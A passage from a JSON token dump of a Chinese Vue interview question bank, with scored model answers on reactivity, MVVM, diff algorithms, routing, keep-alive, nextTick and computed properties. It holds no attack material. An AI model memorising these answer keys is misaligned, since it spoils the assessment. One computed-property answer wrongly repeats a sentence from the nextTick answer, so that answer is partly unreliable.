通知相关依赖进行更新操作(发布订阅)。","escaped":false}]}]},{"type":"list_item","raw":"* Vue3.x改用Proxy替代Object.defineProperty。因为Proxy可以直接监听对象和数组的变化，并且有多达13种拦截方法。并且作为新标准将受到浏览器厂商重点持续的性能优化。","task":false,"loose":true,"text":"Vue3.x改用Proxy替代Object.defineProperty。因为Proxy可以直接监听对象和数组的变化，并且有多达13种拦截方法。并且作为新标准将受到浏览器厂商重点持续的性能优化。","tokens":[{"type":"text","raw":"Vue3.x改用Proxy替代Object.defineProperty。因为Proxy可以直接监听对象和数组的变化，并且有多达13种拦截方法。并且作为新标准将受到浏览器厂商重点持续的性能优化。","text":"Vue3.x改用Proxy替代Object.defineProperty。因为Proxy可以直接监听对象和数组的变化，并且有多达13种拦截方法。并且作为新标准将受到浏览器厂商重点持续的性能优化。","tokens":[{"type":"text","raw":"Vue3.x改用Proxy替代Object.defineProperty。因为Proxy可以直接监听对象和数组的变化，并且有多达13种拦截方法。并且作为新标准将受到浏览器厂商重点持续的性能优化。","text":"Vue3.x改用Proxy替代Object.defineProperty。因为Proxy可以直接监听对象和数组的变化，并且有多达13种拦截方法。并且作为新标准将受到浏览器厂商重点持续的性能优化。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 23. 谈一谈对 MVVM 的理解？\\n\\n","depth":2,"text":"23. 谈一谈对 MVVM 的理解？","tokens":[{"type":"text","raw":"23. 谈一谈对 MVVM 的理解？","text":"23. 谈一谈对 MVVM 的理解？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"list","raw":"* MVVM是Model-View-ViewModel缩写，也就是把MVC中的Controller演变成ViewModel。Model层代表数据模型，View代表UI组件，ViewModel是View和Model层的桥梁，数据会绑定到viewModel层并自动将数据渲染到页面中，视图变化的时候会通知viewModel层更新数据.","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* MVVM是Model-View-ViewModel缩写，也就是把MVC中的Controller演变成ViewModel。Model层代表数据模型，View代表UI组件，ViewModel是View和Model层的桥梁，数据会绑定到viewModel层并自动将数据渲染到页面中，视图变化的时候会通知viewModel层更新数据.","task":false,"loose":false,"text":"MVVM是Model-View-ViewModel缩写，也就是把MVC中的Controller演变成ViewModel。Model层代表数据模型，View代表UI组件，ViewModel是View和Model层的桥梁，数据会绑定到viewModel层并自动将数据渲染到页面中，视图变化的时候会通知viewModel层更新数据.","tokens":[{"type":"text","raw":"MVVM是Model-View-ViewModel缩写，也就是把MVC中的Controller演变成ViewModel。Model层代表数据模型，View代表UI组件，ViewModel是View和Model层的桥梁，数据会绑定到viewModel层并自动将数据渲染到页面中，视图变化的时候会通知viewModel层更新数据.","text":"MVVM是Model-View-ViewModel缩写，也就是把MVC中的Controller演变成ViewModel。Model层代表数据模型，View代表UI组件，ViewModel是View和Model层的桥梁，数据会绑定到viewModel层并自动将数据渲染到页面中，视图变化的时候会通知viewModel层更新数据.","tokens":[{"type":"text","raw":"MVVM是Model-View-ViewModel缩写，也就是把MVC中的Controller演变成ViewModel。Model层代表数据模型，View代表UI组件，ViewModel是View和Model层的桥梁，数据会绑定到viewModel层并自动将数据渲染到页面中，视图变化的时候会通知viewModel层更新数据.","text":"MVVM是Model-View-ViewModel缩写，也就是把MVC中的Controller演变成ViewModel。Model层代表数据模型，View代表UI组件，ViewModel是View和Model层的桥梁，数据会绑定到viewModel层并自动将数据渲染到页面中，视图变化的时候会通知viewModel层更新数据.","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 24. vue2.x 和 vuex3.x 渲染器的 diff 算法分别说一下？\\n\\n","depth":2,"text":"24. vue2.x 和 vuex3.x 渲染器的 diff 算法分别说一下？","tokens":[{"type":"text","raw":"24. vue2.x 和 vuex3.x 渲染器的 diff 算法分别说一下？","text":"24. vue2.x 和 vuex3.x 渲染器的 diff 算法分别说一下？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"简单来说，diff算法有以下过程","text":"简单来说，diff算法有以下过程","tokens":[{"type":"text","raw":"简单来说，diff算法有以下过程","text":"简单来说，diff算法有以下过程","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* 同级比较，再比较子节点\\n\\n* 先判断一方有子节点一方没有子节点的情况(如果新的children没有子节点，将旧的子节点移除)\\n\\n* 比较都有子节点的情况(核心diff)\\n\\n* 递归比较子节点","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 同级比较，再比较子节点\\n\\n","task":false,"loose":true,"text":"同级比较，再比较子节点\\n","tokens":[{"type":"text","raw":"同级比较，再比较子节点\\n","text":"同级比较，再比较子节点","tokens":[{"type":"text","raw":"同级比较，再比较子节点","text":"同级比较，再比较子节点","escaped":false}]}]},{"type":"list_item","raw":"* 先判断一方有子节点一方没有子节点的情况(如果新的children没有子节点，将旧的子节点移除)\\n\\n","task":false,"loose":true,"text":"先判断一方有子节点一方没有子节点的情况(如果新的children没有子节点，将旧的子节点移除)\\n","tokens":[{"type":"text","raw":"先判断一方有子节点一方没有子节点的情况(如果新的children没有子节点，将旧的子节点移除)\\n","text":"先判断一方有子节点一方没有子节点的情况(如果新的children没有子节点，将旧的子节点移除)","tokens":[{"type":"text","raw":"先判断一方有子节点一方没有子节点的情况(如果新的children没有子节点，将旧的子节点移除)","text":"先判断一方有子节点一方没有子节点的情况(如果新的children没有子节点，将旧的子节点移除)","escaped":false}]}]},{"type":"list_item","raw":"* 比较都有子节点的情况(核心diff)\\n\\n","task":false,"loose":true,"text":"比较都有子节点的情况(核心diff)\\n","tokens":[{"type":"text","raw":"比较都有子节点的情况(核心diff)\\n","text":"比较都有子节点的情况(核心diff)","tokens":[{"type":"text","raw":"比较都有子节点的情况(核心diff)","text":"比较都有子节点的情况(核心diff)","escaped":false}]}]},{"type":"list_item","raw":"* 递归比较子节点","task":false,"loose":true,"text":"递归比较子节点","tokens":[{"type":"text","raw":"递归比较子节点","text":"递归比较子节点","tokens":[{"type":"text","raw":"递归比较子节点","text":"递归比较子节点","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Vue2的核心Diff算法采用了双端比较的算法，同时从新旧children的两端开始进行比较，借助key值找到可复用的节点，再进行相关操作。相比React的Diff算法，同样情况下可以减少移动节点次数，减少不必要的性能损耗，更加的优雅。","text":"Vue2的核心Diff算法采用了双端比较的算法，同时从新旧children的两端开始进行比较，借助key值找到可复用的节点，再进行相关操作。相比React的Diff算法，同样情况下可以减少移动节点次数，减少不必要的性能损耗，更加的优雅。","tokens":[{"type":"text","raw":"Vue2的核心Diff算法采用了双端比较的算法，同时从新旧children的两端开始进行比较，借助key值找到可复用的节点，再进行相关操作。相比React的Diff算法，同样情况下可以减少移动节点次数，减少不必要的性能损耗，更加的优雅。","text":"Vue2的核心Diff算法采用了双端比较的算法，同时从新旧children的两端开始进行比较，借助key值找到可复用的节点，再进行相关操作。相比React的Diff算法，同样情况下可以减少移动节点次数，减少不必要的性能损耗，更加的优雅。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Vue3.x借鉴了 ivi算法和 inferno算法","text":"Vue3.x借鉴了 ivi算法和 inferno算法","tokens":[{"type":"text","raw":"Vue3.x借鉴了 ivi算法和 inferno算法","text":"Vue3.x借鉴了 ivi算法和 inferno算法","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在创建VNode时就确定其类型，以及在mount/patch的过程中采用位运算来判断一个VNode的类型，在这个基础之上再配合核心的Diff算法，使得性能上较Vue2.x有了提升。(实际的实现可以结合Vue3.x源码看。)","text":"在创建VNode时就确定其类型，以及在mount/patch的过程中采用位运算来判断一个VNode的类型，在这个基础之上再配合核心的Diff算法，使得性能上较Vue2.x有了提升。(实际的实现可以结合Vue3.x源码看。)","tokens":[{"type":"text","raw":"在创建VNode时就确定其类型，以及在mount/patch的过程中采用位运算来判断一个VNode的类型，在这个基础之上再配合核心的Diff算法，使得性能上较Vue2.x有了提升。(实际的实现可以结合Vue3.x源码看。)","text":"在创建VNode时就确定其类型，以及在mount/patch的过程中采用位运算来判断一个VNode的类型，在这个基础之上再配合核心的Diff算法，使得性能上较Vue2.x有了提升。(实际的实现可以结合Vue3.x源码看。)","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 25. vue 组件通信方式有哪些？\\n\\n","depth":2,"text":"25. vue 组件通信方式有哪些？","tokens":[{"type":"text","raw":"25. vue 组件通信方式有哪些？","text":"25. vue 组件通信方式有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"父子组件通信","text":"父子组件通信","tokens":[{"type":"text","raw":"父子组件通信","text":"父子组件通信","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"父->子props，子->父 $on、$emit","text":"父->子props，子->父 $on、$emit","tokens":[{"type":"text","raw":"父->子props，子->父 $on、$emit","text":"父->子props，子->父 $on、$emit","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"获取父子组件实例 $parent、$children","text":"获取父子组件实例 $parent、$children","tokens":[{"type":"text","raw":"获取父子组件实例 $parent、$children","text":"获取父子组件实例 $parent、$children","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Ref 获取实例的方式调用组件的属性或者方法","text":"Ref 获取实例的方式调用组件的属性或者方法","tokens":[{"type":"text","raw":"Ref 获取实例的方式调用组件的属性或者方法","text":"Ref 获取实例的方式调用组件的属性或者方法","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Provide、inject 官方不推荐使用，但是写组件库时很常用","text":"Provide、inject 官方不推荐使用，但是写组件库时很常用","tokens":[{"type":"text","raw":"Provide、inject 官方不推荐使用，但是写组件库时很常用","text":"Provide、inject 官方不推荐使用，但是写组件库时很常用","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"兄弟组件通信","text":"兄弟组件通信","tokens":[{"type":"text","raw":"兄弟组件通信","text":"兄弟组件通信","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Event Bus 实现跨组件通信，代码繁琐，不推荐","text":"Event Bus 实现跨组件通信，代码繁琐，不推荐","tokens":[{"type":"text","raw":"Event Bus 实现跨组件通信，代码繁琐，不推荐","text":"Event Bus 实现跨组件通信，代码繁琐，不推荐","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Vuex 官方推荐使用，功能强大，vue-devtools有插件支持","text":"Vuex 官方推荐使用，功能强大，vue-devtools有插件支持","tokens":[{"type":"text","raw":"Vuex 官方推荐使用，功能强大，vue-devtools有插件支持","text":"Vuex 官方推荐使用，功能强大，vue-devtools有插件支持","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 26. Vue的路由实现, hash路由和history路由实现原理说一下？\\n\\n","depth":2,"text":"26. Vue的路由实现, hash路由和history路由实现原理说一下？","tokens":[{"type":"text","raw":"26. Vue的路由实现, hash路由和history路由实现原理说一下？","text":"26. Vue的路由实现, hash路由和history路由实现原理说一下？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"`location.hash`的值实际就是URL中`#`后面的东西。","text":"`location.hash`的值实际就是URL中`#`后面的东西。","tokens":[{"type":"codespan","raw":"`location.hash`","text":"location.hash"},{"type":"text","raw":"的值实际就是URL中","text":"的值实际就是URL中","escaped":false},{"type":"codespan","raw":"`#`","text":"#"},{"type":"text","raw":"后面的东西。","text":"后面的东西。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"history实际采用了HTML5中提供的API来实现，主要有history.pushState()和history.replaceState()。","text":"history实际采用了HTML5中提供的API来实现，主要有history.pushState()和history.replaceState()。","tokens":[{"type":"text","raw":"history实际采用了HTML5中提供的API来实现，主要有history.pushState()和history.replaceState()。","text":"history实际采用了HTML5中提供的API来实现，主要有history.pushState()和history.replaceState()。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 27. keep-alive的常用属性有哪些及实现原理\\n\\n","depth":2,"text":"27. keep-alive的常用属性有哪些及实现原理","tokens":[{"type":"text","raw":"27. keep-alive的常用属性有哪些及实现原理","text":"27. keep-alive的常用属性有哪些及实现原理","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"keep-alive可以实现组件缓存，当组件切换时不会对当前组件进行卸载。","text":"keep-alive可以实现组件缓存，当组件切换时不会对当前组件进行卸载。","tokens":[{"type":"text","raw":"keep-alive可以实现组件缓存，当组件切换时不会对当前组件进行卸载。","text":"keep-alive可以实现组件缓存，当组件切换时不会对当前组件进行卸载。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"常用的两个属性include/exclude，允许组件有条件的进行缓存。","text":"常用的两个属性include/exclude，允许组件有条件的进行缓存。","tokens":[{"type":"text","raw":"常用的两个属性include/exclude，允许组件有条件的进行缓存。","text":"常用的两个属性include/exclude，允许组件有条件的进行缓存。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"两个生命周期activated/deactivated，用来得知当前组件是否处于活跃状态。","text":"两个生命周期activated/deactivated，用来得知当前组件是否处于活跃状态。","tokens":[{"type":"text","raw":"两个生命周期activated/deactivated，用来得知当前组件是否处于活跃状态。","text":"两个生命周期activated/deactivated，用来得知当前组件是否处于活跃状态。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"keep-alive的中还运用了LRU(Least Recently Used)算法。","text":"keep-alive的中还运用了LRU(Least Recently Used)算法。","tokens":[{"type":"text","raw":"keep-alive的中还运用了LRU(Least Recently Used)算法。","text":"keep-alive的中还运用了LRU(Least Recently Used)算法。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 28. nextTick 的作用是什么？他的实现原理是什么？\\n\\n","depth":2,"text":"28. nextTick 的作用是什么？他的实现原理是什么？","tokens":[{"type":"text","raw":"28. nextTick 的作用是什么？他的实现原理是什么？","text":"28. nextTick 的作用是什么？他的实现原理是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"paragraph","raw":"在下次 DOM 更新循环结束之后执行延迟回调。nextTick主要使用了宏任务和微任务。根据执行环境分别尝试采用","text":"在下次 DOM 更新循环结束之后执行延迟回调。nextTick主要使用了宏任务和微任务。根据执行环境分别尝试采用","tokens":[{"type":"text","raw":"在下次 DOM 更新循环结束之后执行延迟回调。nextTick主要使用了宏任务和微任务。根据执行环境分别尝试采用","text":"在下次 DOM 更新循环结束之后执行延迟回调。nextTick主要使用了宏任务和微任务。根据执行环境分别尝试采用","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* Promise\\n\\n* MutationObserver\\n\\n* setImmediate\\n\\n* setTimeout","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* Promise\\n\\n","task":false,"loose":true,"text":"Promise\\n","tokens":[{"type":"text","raw":"Promise\\n","text":"Promise","tokens":[{"type":"text","raw":"Promise","text":"Promise","escaped":false}]}]},{"type":"list_item","raw":"* MutationObserver\\n\\n","task":false,"loose":true,"text":"MutationObserver\\n","tokens":[{"type":"text","raw":"MutationObserver\\n","text":"MutationObserver","tokens":[{"type":"text","raw":"MutationObserver","text":"MutationObserver","escaped":false}]}]},{"type":"list_item","raw":"* setImmediate\\n\\n","task":false,"loose":true,"text":"setImmediate\\n","tokens":[{"type":"text","raw":"setImmediate\\n","text":"setImmediate","tokens":[{"type":"text","raw":"setImmediate","text":"setImmediate","escaped":false}]}]},{"type":"list_item","raw":"* setTimeout","task":false,"loose":true,"text":"setTimeout","tokens":[{"type":"text","raw":"setTimeout","text":"setTimeout","tokens":[{"type":"text","raw":"setTimeout","text":"setTimeout","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"定义了一个异步方法，多次调用nextTick会将方法存入队列中，通过这个异步方法清空当前队列。","text":"定义了一个异步方法，多次调用nextTick会将方法存入队列中，通过这个异步方法清空当前队列。","tokens":[{"type":"text","raw":"定义了一个异步方法，多次调用nextTick会将方法存入队列中，通过这个异步方法清空当前队列。","text":"定义了一个异步方法，多次调用nextTick会将方法存入队列中，通过这个异步方法清空当前队列。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 29. 说一下 Vue 的 computed 的实现原理\\n\\n","depth":2,"text":"29. 说一下 Vue 的 computed 的实现原理","tokens":[{"type":"text","raw":"29. 说一下 Vue 的 computed 的实现原理","text":"29. 说一下 Vue 的 computed 的实现原理","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3分）\\n\\n","depth":4,"text":"解答（3分）","tokens":[{"type":"text","raw":"解答（3分）","text":"解答（3分）","escaped":false}]},{"type":"paragraph","raw":"当组件实例触发生命周期函数 beforeCreate 后，它会做一系列事情，其中就包括对 computed 的处理。","text":"当组件实例触发生命周期函数 beforeCreate 后，它会做一系列事情，其中就包括对 computed 的处理。","tokens":[{"type":"text","raw":"当组件实例触发生命周期函数 beforeCreate 后，它会做一系列事情，其中就包括对 computed 的处理。","text":"当组件实例触发生命周期函数 beforeCreate 后，它会做一系列事情，其中就包括对 computed 的处理。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"它会遍历 computed 配置中的所有属性，为每一个属性创建一个 Watcher 对象，并传入一个函数，该函数的本质其实就是 computed 配置中的 getter，这样一来，getter 运行过程中就会收集依赖","text":"它会遍历 computed 配置中的所有属性，为每一个属性创建一个 Watcher 对象，并传入一个函数，该函数的本质其实就是 computed 配置中的 getter，这样一来，getter 运行过程中就会收集依赖","tokens":[{"type":"text","raw":"它会遍历 computed 配置中的所有属性，为每一个属性创建一个 Watcher 对象，并传入一个函数，该函数的本质其实就是 computed 配置中的 getter，这样一来，getter 运行过程中就会收集依赖","text":"它会遍历 computed 配置中的所有属性，为每一个属性创建一个 Watcher 对象，并传入一个函数，该函数的本质其实就是 computed 配置中的 getter，这样一来，getter 运行过程中就会收集依赖","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"但是和渲染函数不同，为计算属性创建的 Watcher 不会立即执行，因为要考虑到该计算属性是否会被渲染函数使用，如果没有使用，就不会得到执行。因此，在创建 Watcher 的时候，它使用了 lazy 配置，lazy 配置可以让 Watcher 不会立即执行。","text":"但是和渲染函数不同，为计算属性创建的 Watcher 不会立即执行，因为要考虑到该计算属性是否会被渲染函数使用，如果没有使用，就不会得到执行。因此，在创建 Watcher 的时候，它使用了 lazy 配置，lazy 配置可以让 Watcher 不会立即执行。","tokens":[{"type":"text","raw":"但是和渲染函数不同，为计算属性创建的 Watcher 不会立即执行，因为要考虑到该计算属性是否会被渲染函数使用，如果没有使用，就不会得到执行。因此，在创建 Watcher 的时候，它使用了 lazy 配置，lazy 配置可以让 Watcher 不会立即执行。","text":"但是和渲染函数不同，为计算属性创建的 Watcher 不会立即执行，因为要考虑到该计算属性是否会被渲染函数使用，如果没有使用，就不会得到执行。因此，在创建 Watcher 的时候，它使用了 lazy 配置，lazy 配置可以让 Watcher 不会立即执行。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"收到 lazy 的影响，Watcher 内部会保存两个关键属性来实现缓存，一个是 value，一个是 dirty","text":"收到 lazy 的影响，Watcher 内部会保存两个关键属性来实现缓存，一个是 value，一个是 dirty","tokens":[{"type":"text","raw":"收到 lazy 的影响，Watcher 内部会保存两个关键属性来实现缓存，一个是 value，一个是 dirty","text":"收到 lazy 的影响，Watcher 内部会保存两个关键属性来实现缓存，一个是 value，一个是 dirty","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"value 属性用于保存 Watcher 运行的结果，受 lazy 的影响，该值在最开始是 undefined","text":"value 属性用于保存 Watcher 运行的结果，受 lazy 的影响，该值在最开始是 undefined","tokens":[{"type":"text","raw":"value 属性用于保存 Watcher 运行的结果，受 lazy 的影响，该值在最开始是 undefined","text":"value 属性用于保存 Watcher 运行的结果，受 lazy 的影响，该值在最开始是 undefined","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"dirty 属性用于指示当前的 value 是否已经过时了，即是否为脏值，受 lazy 的影响，该值在最开始是 true","text":"dirty 属性用于指示当前的 value 是否已经过时了，即是否为脏值，受 lazy 的影响，该值在最开始是 true","tokens":[{"type":"text","raw":"dirty 属性用于指示当前的 value 是否已经过时了，即是否为脏值，受 lazy 的影响，该值在最开始是 true","text":"dirty 属性用于指示当前的 value 是否已经过时了，即是否为脏值，受 lazy 的影响，该值在最开始是 true","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"定义了一个异步方法，多次调用nextTick会将方法存入队列中，通过这个异步方法清空当前队列。","text":"定义了一个异步方法，多次调用nextTick会将方法存入队列中，通过这个异步方法清空当前队列。","tokens":[{"type":"text","raw":"定义了一个异步方法，多次调用nextTick会将方法存入队列中，通过这个异步方法清空当前队列。","text":"定义了一个异步方法，多次调用nextTick会将方法存入队列中，通过这个异步方法清空当前队列。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Watcher 创建好后，vue 会使用代理模式，将计算属性挂载到组件实例中","text":"Watcher 创建好后，vue 会使用代理模式，将计算属性挂载到组件实例中","tokens":[{"type":"text","raw":"Watcher 创建好后，vue 会使用代理模式，将计算属性挂载到组件实例中","text":"Watcher 创建好后，vue 会使用代理模式，将计算属性挂载到组件实例中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"当读取计算属性时，vue 检查其对应的 Watcher 是否是脏值，如果是，则运行函数，计算依赖，并得到对应的值，保存在 Watcher 的 value 中，然后设置 dirty 为 false，然后返回。","text":"当读取计算属性时，vue 检查其对应的 Watcher 